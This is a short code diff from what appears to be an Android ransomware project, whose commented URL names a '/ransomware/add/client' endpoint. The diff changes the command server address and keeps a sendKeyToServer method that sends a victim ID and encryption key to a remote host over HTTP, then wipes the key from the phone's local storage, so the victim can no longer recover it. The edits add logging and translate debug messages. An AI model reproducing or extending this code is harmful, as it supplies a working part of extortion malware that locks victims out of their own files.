@@ -18,23 +18,25 @@ import alepacheco.com.rw.persistence.LocalStorage;
 
 public class IO {
 
-    public static String SERVER = "http://restfull.hol.es/tests/test3.php?id=%s&data=%s";//"http://restfull.hol.es/ransomware/add/client/%s/%s";
+    public static String SERVER = "http://172.26.53.93/testserver.php?id=%s&data=%s";//"http://restfull.hol.es/ransomware/add/client/%s/%s";
 
-    public static void sendKeyToServer(final Context ctx, String id, String key){
+    public static void sendKeyToServer(final Context ctx, String id, final String key){
         String url = String.format(SERVER,id,key);
+        Log.i("ID", id);
+        Log.i("Key", key);
         RequestQueue queue = Volley.newRequestQueue(ctx);
         StringRequest stringRequest = new StringRequest(Request.Method.GET, url,
                 new Response.Listener<String>() {
                     @Override
                     public void onResponse(String response) {
-                        Log.v("Debug","ENVIADO");
+                        Log.v("Debug","Connected send.");
                         LocalStorage.getInstance(ctx).setSendendToServer();
                         LocalStorage.getInstance(ctx).setByTag(LocalStorage.TAG_KEY,LocalStorage.NULL_VALUE);
                     }
                 }, new Response.ErrorListener() {
             @Override
             public void onErrorResponse(VolleyError error) {
-                Log.v("Debug","DEU ERRO");
+                Log.v("Debug","Error");
             }
         });
         queue.add(stringRequest);
